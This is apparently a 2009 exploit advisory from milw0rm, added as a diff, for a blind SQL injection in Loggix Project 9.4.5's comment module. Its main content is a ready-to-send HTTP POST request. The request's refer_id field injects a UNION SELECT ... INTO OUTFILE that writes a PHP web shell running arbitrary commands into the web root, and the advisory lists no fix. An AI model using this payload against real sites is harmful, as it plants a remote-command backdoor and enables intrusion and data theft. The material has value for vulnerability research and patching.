@@ -1,0 +1,67 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Loggix Project
+[+] Version: 9.4.5
+[+] Website: http://loggix.gotdns.org
+
+[+] Bugs: [A] Blind SQL Injection
+
+[+] Exploitation: Remote
+[+] Date: 10 Apr 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Blind SQL Injection
+
+[-] Risk: medium
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: modules/comment/post.php
+
+This bug allows a guest to execute arbitrary
+queries.
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Blind SQL Injection
+
+POST /path/modules/comment/post.php HTTP/1.1\r\n
+Host: site\r\n
+Keep-Alive: 300\r\n
+Connection: keep-alive\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 177\r\n
+\r\n
+title=title&comment=comment&user_name=user&user_pass=password&parent_key=key&refer_id=-1' UNION ALL SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/htdocs/rce.php
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-04-10]
